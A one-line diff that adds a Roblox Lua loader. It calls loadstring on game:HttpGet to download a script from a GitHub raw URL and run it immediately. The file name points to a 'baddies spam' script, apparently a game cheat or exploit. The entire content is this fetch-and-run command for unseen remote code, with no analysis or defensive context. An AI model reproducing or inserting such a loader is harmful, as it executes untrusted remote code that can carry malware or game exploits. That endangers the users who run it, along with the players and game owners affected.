@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/upd-baddies-spam1-s84y0wgeodypig.lua"))()
